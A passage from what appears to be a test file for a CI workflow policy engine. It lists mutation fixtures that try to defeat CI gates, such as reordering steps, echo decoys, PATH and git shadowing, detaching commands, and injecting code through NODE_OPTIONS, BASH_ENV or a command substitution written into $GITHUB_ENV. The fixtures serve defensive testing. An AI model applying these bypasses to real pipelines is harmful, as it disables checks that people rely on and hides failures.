    mutate: (s) => replaceOnce(s, '        run: node scripts/ci/assert-floor-ratchet.mjs\n', ''),
    message: /never runs the floor-ratchet assertion/,
  },
  {
    name: 'the e2e job hollowed out — the browser gate gone, the job still green',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(s, '        run: node scripts/ci/assert-playwright-report.mjs\n', ''),
    message: /never runs the e2e report gate/,
  },
  {
    name: 'the whole verify job replaced by a call to a workflow in someone else’s repository',
    rule: 'no-remote-reusable-workflow',
    mutate: (s) =>
      replaceOnce(
        s,
        '  verify:\n    name: lint · typecheck · test · build\n',
        '  verify:\n    uses: some-org/shared-workflows/.github/workflows/verify.yml@main\n    name: lint · typecheck · test · build\n',
      ),
    message: /job `verify` delegates to the reusable workflow/,
    // A reusable-workflow call *is* a `uses:` line, and `…/verify.yml@main` is a
    // mutable ref by construction. There is no way to write this mutation
    // without also being unpinned; the two rules are looking at the same line.
    also: ['pin-actions-to-sha'],
  },
  {
    name: 'secrets handed to a called workflow',
    rule: 'no-remote-reusable-workflow',
    mutate: (s) =>
      replaceOnce(
        s,
        '  gate:\n    name: gate\n',
        '  gate:\n    secrets: inherit\n    name: gate\n',
      ),
    message: /job `gate` passes `secrets:` to a called workflow/,
  },
  {
    name: 'the gate no longer comparing results against the literal "success"',
    rule: 'gate-inspects-needs',
    mutate: (s) => replaceOnce(s, 'value.result !== "success"', 'value.result !== "anything"'),
    message: /never compares a result against the literal `success`/,
  },
  {
    name: 'the gate losing its empty-needs guard, so an emptied gate passes vacuously',
    rule: 'gate-inspects-needs',
    mutate: (s) =>
      replaceOnce(
        s,
        '            if (entries.length === 0) {',
        '            if (entries.length === -1) {',
      ),
    message: /does not fail on an empty `needs`/,
  },
  {
    name: 'the gate keeping every incriminating word but losing its exit — round 2 passed this',
    rule: 'gate-inspects-needs',
    mutate: (s) => {
      if (!s.includes('process.exit(1);'))
        throw new Error('mutation target not found: process.exit(1);');
      return s.split('process.exit(1);').join('console.info("would have failed");');
    },
    message: /never exits non-zero/,
  },

  // ---- the rules round 4 adds ---------------------------------------------
  // Every one of these leaves the assert script in place, named, and running.
  // That is the point: round 3's presence rules all pass on each of them.
  {
    name: "the ratchet's baseline fetch deleted, sending it down its green no-baseline path",
    rule: 'required-step-prerequisites',
    mutate: (s) => deleteStep(s, 'Fetch the baseline manifest from main'),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'the baseline fetch moved to after the ratchet that reads it',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Fetch the baseline manifest from main',
        'Assert the CI floors have not been ratcheted down',
      ),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'the vitest report reset deleted, so freshness can no longer be proven',
    rule: 'required-step-prerequisites',
    mutate: (s) => deleteStep(s, 'Record when the test run started'),
    pair: PAIRS.suiteNeedsReset,
  },
  {
    name: 'the report reset moved to after the run it is supposed to precede',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Record when the test run started', 'Unit + integration tests'),
    pair: PAIRS.suiteNeedsReset,
  },
  // Round 4 modelled these two as deletions. Both deleted a step that is *also*
  // required in its own right, so both went red under `required-job-steps` and
  // would have gone red with the prerequisite rule removed from the engine
  // entirely — theatre, in the exact sense this file exists to prevent. A
  // reorder is the pure form: the step is still present and still invoked, and
  // only the ordering half of the pair is broken.
  {
    name: 'the wait for Postgres reordered after the migration it protects, turning it into a race',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Wait for Postgres', 'Apply migrations'),
    pair: PAIRS.migrationsNeedPostgres,
  },
  {
    name: 'the migrations reordered after the schema assertion that checks them',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(s, 'Apply migrations', 'Assert the database matches the schema exactly'),
    pair: PAIRS.schemaNeedsMigrations,
  },
  // The two pairs round 4 declared and never mutated in isolation: a report gate
  // that runs before the run it reports on. Modelled as a reorder for the same
  // reason — the gate is still present, still named, still invoked.
  {
    name: 'the vitest report gate reordered before the suite, so it reads the previous run',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(s, 'Assert the suite actually ran', 'Record when the test run started'),
    pair: PAIRS.vitestGateNeedsSuite,
  },
  {
    name: 'the e2e report gate reordered before the suite it reports on',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(s, 'Assert the e2e suite actually ran', 'Record when the e2e run started'),
    pair: PAIRS.e2eGateNeedsSuite,
  },
  {
    name: 'the e2e report reset deleted, so a leftover report can stand in for a run',
    rule: 'required-step-prerequisites',
    mutate: (s) => deleteStep(s, 'Record when the e2e run started'),
    pair: PAIRS.e2eSuiteNeedsReset,
  },
  {
    name: 'the e2e report reset moved to after the suite it is supposed to precede',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Record when the e2e run started', 'Run e2e suite'),
    pair: PAIRS.e2eSuiteNeedsReset,
  },
  {
    name: 'the browser-presence assertion moved to after the suite it guards',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Assert Chromium is present', 'Run e2e suite'),
    pair: PAIRS.e2eSuiteNeedsChromium,
  },
  {
    name: 'the Chromium install dropped, leaving the assertion guaranteed to fail',
    rule: 'required-step-prerequisites',
    mutate: (s) => deleteStep(s, 'Install Chromium'),
    pair: PAIRS.chromiumNeedsInstall,
  },
  {
    name: 'the Chromium install reordered after the assertion that checks it worked',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Install Chromium', 'Assert Chromium is present'),
    pair: PAIRS.chromiumNeedsInstall,
  },
  {
    name: 'an assert script demoted to something a shell merely prints',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs',
        'echo node ../../scripts/ci/assert-tables.mjs',
      ),
    message: /never runs the schema set-equality assertion/,
  },

  // ---- the mutation round 4 did not write ---------------------------------
  // Gutted-but-matching setup: the step is present, named, and every character
  // of its script is still in the file — inside an `echo`. Round 4's
  // prerequisite tests were substring matches, so all six of these passed the
  // policy while doing nothing, and the ratchet one passed the *run* too,
  // because a fetch that never happens sends the ratchet down its no-baseline
  // exit-0 path. Policy green and runtime green over a deleted gate is the
  // fail-open the rule was written to close.
  {
    name: 'the baseline fetch quoted into an echo: present, matching, and doing nothing',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Fetch the baseline manifest from main'),
    pair: PAIRS.ratchetNeedsFetch,
  },
  {
    name: 'the vitest report reset quoted into an echo, so VITEST_RUN_START is never exported',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Record when the test run started'),
    pair: PAIRS.suiteNeedsReset,
  },
  {
    name: 'the e2e report reset quoted into an echo, so E2E_RUN_START is never exported',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Record when the e2e run started'),
    pair: PAIRS.e2eSuiteNeedsReset,
  },
  {
    name: 'the Chromium install quoted into an echo, so no browser is ever downloaded',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Install Chromium'),
    pair: PAIRS.chromiumNeedsInstall,
  },
  {
    name: 'the wait for Postgres quoted into an echo, so the migration races an empty socket',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Wait for Postgres'),
    pair: PAIRS.migrationsNeedPostgres,
    // The wait is a required step in its own right as well as a prerequisite, so
    // an inert one is caught twice. Both are the same edit; neither is theatre.
    also: ['required-job-steps'],
  },
  {
    name: 'the migration quoted into an echo, so the schema assertion checks an empty database',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Apply migrations'),
    pair: PAIRS.schemaNeedsMigrations,
    also: ['required-job-steps'],
  },
  {
    name: 'the browser-presence assertion quoted into an echo before the suite it guards',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Assert Chromium is present'),
    pair: PAIRS.e2eSuiteNeedsChromium,
    also: ['required-job-steps'],
  },

  // ---- the round-5 gauntlet's four, round 6 ------------------------------
  // The first one is this round's acceptance case, and it is deliberately the
  // *required step* rather than a prerequisite: round 5's matcher allowed
  // arbitrary text between a package manager and a later `exec`, so nine words
  // turned every protected step in this file into a mention of itself. Verified
  // against the round-5 engine directly: clean.
  {
    name: 'the ratchet rewritten as a fake `exec` — the round-5 blocking bypass',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: node scripts/ci/assert-floor-ratchet.mjs\n',
        '        run: pnpm --version && echo exec node scripts/ci/assert-floor-ratchet.mjs\n',
      ),
    message: /never runs the floor-ratchet assertion/,
  },
  {
    name: 'a shell function shadowing `git`, so the fetch runs and does nothing',
    rule: 'no-command-shadowing',
    mutate: (s) => rewriteFetch(s, ['git() { :; }', FETCH]),
    message: /defines a shell function `git\(\)`/,
    // Shadowing takes a second command to install, and the step it is installed
    // in is protected. The shape rule sees the extra command; the shadowing rule
    // sees what that command does. Neither subsumes the other.
    also: ['protected-steps-run-one-command'],
  },
  {
    name: 'a directory prepended to PATH, which decides what every command word means',
    rule: 'no-command-shadowing',
    mutate: (s) => rewriteFetch(s, ['export PATH="$PWD/.fake-bin:$PATH"', FETCH]),
    message: /runs `export PATH=…`/,
    also: ['protected-steps-run-one-command'],
  },
  {
    name: 'the same shadowing spelled as a write to $GITHUB_PATH, which outlives the step',
    rule: 'no-command-shadowing',
    mutate: (s) => rewriteFetch(s, ['echo "$PWD/.fake-bin" >> "$GITHUB_PATH"', FETCH]),
    message: /writes to `\$GITHUB_PATH`/,
    also: ['protected-steps-run-one-command'],
  },
  {
    name: 'the run-start timestamp appended to a lookalike file instead of the job environment',
    rule: 'required-step-prerequisites',
    mutate: (s) => replaceOnce(s, '>> "$GITHUB_ENV"', '>> "$GITHUB_ENV.bak"'),
    pair: PAIRS.suiteNeedsReset,
  },
  {
    name: 'the same, single-quoted, so it writes a file literally called $GITHUB_ENV',
    rule: 'required-step-prerequisites',
    mutate: (s) => replaceOnce(s, '>> "$GITHUB_ENV"', ">> '$GITHUB_ENV'"),
    pair: PAIRS.suiteNeedsReset,
  },

  {
    name: 'the e2e migration moved after the suite, so both servers query tables that do not exist',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Migrate the e2e database', 'Run e2e suite'),
    pair: PAIRS.e2eSuiteNeedsMigration,
  },
  {
    name: 'the e2e migration quoted into an echo: present, named, and migrating nothing',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Migrate the e2e database'),
    pair: PAIRS.e2eSuiteNeedsMigration,
    // The migration is a required step in its own right as well as a
    // prerequisite, so an inert one is caught twice. Both are the same edit.
    also: ['required-job-steps'],
  },

  // ---- the deployment job's ten pairs (#40) -------------------------------
  //
  // Every one of these is a *reorder*, not a deletion, for the reason round 4's
  // gauntlet gave: a mutation that deletes a step which is also required in its
  // own right goes red under `required-job-steps` and would go red with the
  // prerequisite rule removed from the engine entirely. Reordered, the step is
  // still present, still named, still invoked, and only the ordering half of the
  // pair is broken — which is exactly the accident a rebase produces.
  //
  // Several of them break more than one pair, because several steps depend on
  // the same setup: moving the stack boot past the health assertion also moves
  // it past the certificate copy. That is fine and is not theatre — the
  // self-test asserts on the *identity* of the pair each mutation claims, so a
  // mutation that broke a different pair would not satisfy the one it names.
  //
  // The last two are the ones worth reading. `teardownAssertionNeedsTeardown`
  // is the only pair in this file whose broken form fails *open*: an assertion
  // that "nothing survives `docker compose down -v`", run before the teardown,
  // inspects a stack that is still up and says so — loud. But quote the
  // teardown into an `echo` and it is the ratchet's no-baseline shape all over
  // again, so both spellings are here.
  {
    name: 'the stack brought up from whatever image happened to be cached',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Build the images', 'Bring the stack up'),
    pair: PAIRS.bootNeedsBuild,
  },
  {
    name: 'the host preflighted after the ports it refuses are already published',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(s, 'Preflight the host before anything is built', 'Bring the stack up'),
    pair: PAIRS.bootNeedsPreflight,
  },
  {
    name: 'the image IDs recorded before the build that produces them',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Build the images', 'Record the image IDs this run built'),
    pair: PAIRS.recordNeedsBuild,
  },
  {
    name: 'the running images compared against a manifest written afterwards',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Record the image IDs this run built',
        'Assert the stack runs exactly the images this run built',
      ),
    pair: PAIRS.identityNeedsRecord,
  },
  {
    name: 'the image identity of containers nothing has started yet',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Bring the stack up',
        'Assert the stack runs exactly the images this run built',
      ),
    pair: PAIRS.identityNeedsBoot,
  },
  {
    name: 'the bundle scanned with nothing yet saying which image ID to scan',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Record the image IDs this run built',
        'Assert no realtime origin is compiled into the web image',
      ),
    pair: PAIRS.imageOriginsNeedsRecord,
  },
  {
    name: 'the image scanned before it is built, so it reports on the last run’s bundle',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Build the images',
        'Assert no realtime origin is compiled into the web image',
      ),
    pair: PAIRS.imageOriginsNeedsBuild,
  },
  {
    name: 'the certificate authority copied before the proxy that mints it has started',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(s, 'Bring the stack up', "Trust the deployment's certificate authority"),
    pair: PAIRS.caNeedsBoot,
  },
  {
    name: 'the health of containers nothing has started yet',
    rule: 'required-step-prerequisites',
    mutate: (s) => moveStepAfter(s, 'Bring the stack up', 'Assert every container is healthy'),
    pair: PAIRS.healthNeedsBoot,
  },
  {
    name: 'the running configuration read before anything is running',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Bring the stack up',
        'Assert the stack is running the production configuration',
      ),
    pair: PAIRS.configNeedsBoot,
  },
  {
    name: 'the page assertion run before the certificate it verifies against exists',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        "Trust the deployment's certificate authority",
        "Assert the app renders / and /app from this run's database",
      ),
    pair: PAIRS.pageNeedsCa,
  },
  {
    name: 'the signup assertion run before the certificate authority is trusted',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        "Trust the deployment's certificate authority",
        'Assert signup sends a verification mail that verifies',
      ),
    pair: PAIRS.signupNeedsCa,
  },
  {
    name: 'the websocket assertion run before the certificate authority is trusted',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        "Trust the deployment's certificate authority",
        'Assert an authenticated websocket upgrade completes',
      ),
    pair: PAIRS.wsNeedsCa,
  },
  {
    name: 'the rate-limit assertion run before its callers can verify the certificate',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        "Trust the deployment's certificate authority",
        'Assert the rate limiter counts per address',
      ),
    pair: PAIRS.rateLimitNeedsCa,
  },
  {
    name: 'the teardown assertion run before the teardown, against a stack that is still up',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(s, 'Tear down the stack', 'Assert the teardown left nothing behind'),
    pair: PAIRS.teardownAssertionNeedsTeardown,
  },
  {
    name: 'the teardown quoted into an echo, so four named volumes survive it',
    rule: 'required-step-prerequisites',
    mutate: (s) => decoyStep(s, 'Tear down the stack'),
    pair: PAIRS.teardownAssertionNeedsTeardown,
    // The decoy is `echo '<the teardown>'`, and `echo` is not one of the two
    // things the deploy job may run. Both violations are true and neither is
    // redundant: one says the teardown does not happen, the other says this job
    // ran a binary nobody justified.
    also: ['compose-through-one-entrypoint'],
  },
  // ---- the compose verbs (#40 round 3) ------------------------------------
  // `--wait` and `-v` used to be words in the workflow, and two mutations here
  // deleted them. They live in scripts/ci/compose-stack.mjs now, with the file
  // list they had to move with, so what this file can still prove is that the
  // right *verb* is invoked. That each verb's argv carries its load-bearing flag
  // is asserted by gate-selftest.mjs, which builds the argv — a test of the code
  // rather than a match against the text beside it.
  {
    name: 'the stack boot pointed at a different compose verb, so nothing brings the stack up',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/compose-stack.mjs up',
        'run: node scripts/ci/compose-stack.mjs build',
      ),
    message: /never runs the stack boot/,
    // Every assertion in the job depends on the boot, so removing the shape the
    // rule recognises necessarily orphans every prerequisite pair pointing at
    // it. One edit, several true statements.
    also: ['required-step-prerequisites'],
  },
  {
    name: 'the teardown pointed at a different compose verb, so the named volumes outlive the run',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/compose-stack.mjs down',
        'run: node scripts/ci/compose-stack.mjs trust-ca',
      ),
    pair: PAIRS.teardownAssertionNeedsTeardown,
  },

  // ---- the four new deploy pairs ------------------------------------------
  {
    name: 'the image record reordered after the migration-image check that reads it',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Record the image IDs this run built',
        'Assert the migration image is the one this run built',
      ),
    pair: PAIRS.migrationImageNeedsRecord,
  },
  {
    name: 'the migration-image check moved after the boot, so the migration has already run',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Assert the migration image is the one this run built',
        'Bring the stack up',
      ),
    pair: PAIRS.bootNeedsMigrationImage,
  },
  {
    name: 'the schema assertion moved before the boot, so there is no database to read',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        'Assert the deployed database matches the migrations',
        'Record the image IDs this run built',
      ),
    pair: PAIRS.schemaNeedsBoot,
  },
  {
    name: 'the page assertion moved ahead of the signup it borrows a session from',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      moveStepAfter(
        s,
        "Assert the app renders / and /app from this run's database",
        'Assert the deployed database matches the migrations',
      ),
    pair: PAIRS.pageNeedsSignup,
  },

  // ---- reachability: a protected step is one unconditional command --------
  // The round-2 gauntlet's first blocking finding, as fixtures. Every one of
  // these is a genuine invocation in command position, so every presence rule in
  // the engine is satisfied by all of them — which is precisely why the shape
  // has to be refused instead of recognised harder.
  {
    name: 'the page assertion behind a false guard, with a trailing `true` to swallow the status',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: false && node scripts/ci/assert-page-serves.mjs; true',
      ),
    message: /jobs\.deploy\.steps\.\d+\.run is a protected step/,
  },
  {
    name: 'the rate-limit assertion with a trailing success command',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-rate-limit.mjs',
        'run: node scripts/ci/assert-rate-limit.mjs; true',
      ),
    message: /jobs\.deploy\.steps\.\d+\.run is a protected step/,
  },
  {
    name: 'the typechecker wrapped in an `if` whose condition nobody sets',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: pnpm typecheck\n',
        '        run: if [ -n "$RUN_TYPECHECK" ]; then pnpm typecheck; fi\n',
      ),
    message: /jobs\.verify\.steps\.\d+\.run is a protected step/,
  },
  {
    name: 'a deploy assertion backgrounded, so the step reports before it has finished',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-stack-health.mjs',
        'run: node scripts/ci/assert-stack-health.mjs &',
      ),
    message: /jobs\.deploy\.steps\.\d+\.run is a protected step/,
    // A backgrounded command is not a completed one, so the presence rule reads
    // the container-health assertion as absent as well. Both are true, and this
    // is the one shape of the class that was already caught — by accident.
    also: ['required-job-steps'],
  },
  ...Object.entries(SHAPE_REJECTED_FORMS).map(([name, lines]) => ({
    name: `a genuine invocation that need not run: ${name}`,
    rule: 'protected-steps-run-one-command',
    mutate: (s) => rewriteFetch(s, lines),
    message: /jobs\.verify\.steps\.\d+\.run is a protected step/,
  })),

  // ---- what the first version of the shape rule still let through ---------
  // Every one of these was found by a blind cross-lineage review of that rule,
  // and every one of them reproduced: the policy engine reported the mutated
  // workflow clean. They are the same property as `false && …; true` — invoked,
  // not run — one level below the shell.
  {
    name: 'the page assertion compiled rather than run: `node --check`',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: node --check scripts/ci/assert-page-serves.mjs',
      ),
    // Deliberately `required-job-steps` and not the shape rule: `node --check`
    // is one unconditional command and there is nothing wrong with its *shape*.
    // What is wrong is that it is not an invocation of the script at all, so the
    // honest answer is that the step is missing.
    message: /never runs the real-page assertion/,
    // Two true statements about one line, and both are the point. `node --check`
    // is not an invocation of the assertion (so the step is *missing*), and it is
    // not one of the two entrypoints the deploy job may run either — the round-4
    // allowlist refuses it without having heard of `--check`, which is the whole
    // argument for inverting that rule.
    also: ['compose-through-one-entrypoint'],
  },
  {
    name: 'the same, spelled `node -c`',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-ws-upgrade.mjs',
        'run: node -c scripts/ci/assert-ws-upgrade.mjs',
      ),
    message: /never runs the websocket-upgrade assertion/,
    also: ['compose-through-one-entrypoint'],
  },
  {
    name: 'a version banner instead of an assertion: `node --version`',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-stack-config.mjs',
        'run: node --version scripts/ci/assert-stack-config.mjs',
      ),
    message: /never runs the production-configuration assertion/,
    also: ['compose-through-one-entrypoint'],
  },
  // ---- the node-flag denylist, inverted (#40 round 4) ---------------------
  // `--check` and `-c` were closed by name in round 3, and the same question
  // asked once more found three more the list had never heard of. All three
  // read as *missing* now — not because they are on a list, but because they are
  // not on the short list of flags that change diagnostics and nothing else.
  {
    name: 'the assertion run as a test file: `node --test`, which changes what the exit status means',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-stack-teardown.mjs',
        'run: node --test scripts/ci/assert-stack-teardown.mjs',
      ),
    message: /never runs the teardown assertion/,
    also: ['compose-through-one-entrypoint'],
  },
  {
    name: "somebody else's code loaded into the assertion's process first: `node -r`",
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-rate-limit.mjs',
        'run: node -r ./nobble.mjs scripts/ci/assert-rate-limit.mjs',
      ),
    message: /never runs the per-address rate-limit assertion/,
    also: ['compose-through-one-entrypoint'],
  },
  {
    name: 'the same through a module hook: `node --experimental-loader`',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-stack-health.mjs',
        'run: node --experimental-loader ./hook.mjs scripts/ci/assert-stack-health.mjs',
      ),
    message: /never runs the container-health assertion/,
    also: ['compose-through-one-entrypoint'],
  },
  {
    name: 'the assertion behind `xargs -r`, which runs it zero times on empty stdin',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: xargs -r node scripts/ci/assert-page-serves.mjs',
      ),
    message: /reaches the command through `xargs`/,
  },
  {
    name: 'the assertion detached with `sudo -b`, so the step reports before it finishes',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-rate-limit.mjs',
        'run: sudo -b node scripts/ci/assert-rate-limit.mjs',
      ),
    message: /is not one of the options a protected step may use it with/,
  },
  // ---- the fifteenth spelling, and the ones nobody had looked for ----------
  // `setsid -f` is the round-3 gauntlet's blocking finding, measured: `bash -eo
  // pipefail -c 'setsid -f sleep 30'` exits 0 in 2ms. It defeated round 3's rule
  // twice over — `setsid` was in the recognised-launcher table, so `unwrap()`
  // saw through it, and `-f` is neither `-b` nor `--background`. `flock` and
  // `systemd-run` are not findings; they were added by asking what *else* execs
  // an argv on a runner, before anybody used them. All four trip the shape rule
  // and nothing else, which is the proof that recognition has not moved: each is
  // still read as a genuine invocation of the assertion it wraps.
  {
    name: 'the page assertion detached with `setsid -f`, the fifteenth spelling of "invoked is not run"',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: setsid -f node scripts/ci/assert-page-serves.mjs',
      ),
    message: /reaches the command through `setsid`, which is not on the allowlist/,
  },
  {
    name: 'the same, spelled `setsid --fork`',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-ws-upgrade.mjs',
        'run: setsid --fork node scripts/ci/assert-ws-upgrade.mjs',
      ),
    message: /reaches the command through `setsid`, which is not on the allowlist/,
  },
  {
    name: 'a bare `setsid`, which forks anyway when the shell is the group leader',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-stack-health.mjs',
        'run: setsid node scripts/ci/assert-stack-health.mjs',
      ),
    message: /reaches the command through `setsid`, which is not on the allowlist/,
  },
  {
    name: 'the assertion behind `flock -n -E 0`, which exits 0 without running it when the lock is held',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-stack-config.mjs',
        'run: flock -n -E 0 /tmp/atrium.lock node scripts/ci/assert-stack-config.mjs',
      ),
    message: /reaches the command through `flock`, which is not on the allowlist/,
  },
  {
    name: 'the assertion started as a transient unit: `systemd-run`, which returns when it is queued',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-rate-limit.mjs',
        'run: systemd-run --user node scripts/ci/assert-rate-limit.mjs',
      ),
    message: /reaches the command through `systemd-run`, which is not on the allowlist/,
  },
  // ---- the seventeenth and eighteenth, both from this round's own review ---
  // Both were introduced or left open by the round-4 fix itself, and both were
  // clean against the engine when the reviewer was pointed at it.
  {
    name: 'a node flag that swallows the script as its value: `--disable-warning <script>`',
    rule: 'required-job-steps',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: node --disable-warning scripts/ci/assert-page-serves.mjs',
      ),
    // Measured: `node /tmp/fail7.mjs` exits 7 and
    // `node --disable-warning /tmp/fail7.mjs` exits 0 — node takes the path as
    // the flag's value, has no entry point, and reads an empty stdin. The
    // honest verdict is that the assertion is not invoked at all.
    message: /never runs the real-page assertion/,
    also: ['compose-through-one-entrypoint'],
  },
  {
    name: 'the `.env` heredoc with its delimiter unquoted, so the body is shell-expanded',
    rule: 'protected-steps-run-one-command',
    mutate: (s) => replaceOnce(s, "cat > .env <<'ENVIRONMENT'", 'cat > .env <<ENVIRONMENT'),
    message: /with the delimiter unquoted, so the shell expands the body/,
  },
  {
    name: 'the same, carrying the command substitution it exists to hide',
    rule: 'protected-steps-run-one-command',
    mutate: (s) =>
      replaceOnce(
        replaceOnce(s, "cat > .env <<'ENVIRONMENT'", 'cat > .env <<ENVIRONMENT'),
        '          LOG_LEVEL=info\n',
        '          LOG_LEVEL=info$(echo "NODE_OPTIONS=--require ./nobble.cjs" >> "$GITHUB_ENV")\n',
      ),
    message: /with the delimiter unquoted, so the shell expands the body/,
  },

  // ---- the sixteenth: the flags moved into the environment ----------------
  // Round 4 inverted the node-flag denylist, and its own blind review put the
  // flag in `NODE_OPTIONS` instead. Measured before the fix: a script that
  // `process.exit(1)`s exits **0** under
  // `NODE_OPTIONS="--require /tmp/nobble.cjs"`, with its `::error::` annotation
  // still printed. Every gate in this repository is a `node` process, so one
  // line disarms all of them. All four spellings below were clean against the
  // engine an hour before this comment was written.
  {
    name: 'NODE_OPTIONS on the whole workflow, which loads code into every gate',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        "  NODE_VERSION: '22'\n",
        "  NODE_VERSION: '22'\n  NODE_OPTIONS: --require /tmp/nobble.cjs\n",
      ),
    message: /`env:` at .* sets `NODE_OPTIONS`/,
  },
  {
    name: 'the same on the deploy job, where every assertion runs',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
        '      NODE_OPTIONS: --require /tmp/nobble.cjs\n      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
      ),
    message: /`env:` at .* sets `NODE_OPTIONS`/,
  },
  {
    name: 'the same as a one-shot assignment on the page assertion itself',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        'run: node scripts/ci/assert-page-serves.mjs',
        'run: NODE_OPTIONS=--require=/tmp/nobble.cjs node scripts/ci/assert-page-serves.mjs',
      ),
    message: /assigns `NODE_OPTIONS` for one command/,
  },
  {
    name: 'the same written into `$GITHUB_ENV`, so it applies to every later step',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n',
        '        run: echo "NODE_OPTIONS=--require /tmp/nobble.cjs" >> "$GITHUB_ENV"\n',
      ),
    message: /writes `NODE_OPTIONS=…` to `\$GITHUB_ENV`/,
    // The step it replaces is the run-start timestamp the vitest freshness gate
    // depends on, so its pair breaks too. Both are true; the timestamp is gone
    // and the environment is poisoned.
    also: ['required-step-prerequisites'],
  },
  {
    name: 'BASH_ENV, which bash sources before every non-interactive script',
    rule: 'no-command-shadowing',
    mutate: (s) =>
      replaceOnce(
        s,
        '      ATRIUM_STACK_DOMAIN: atrium.localhost\n',
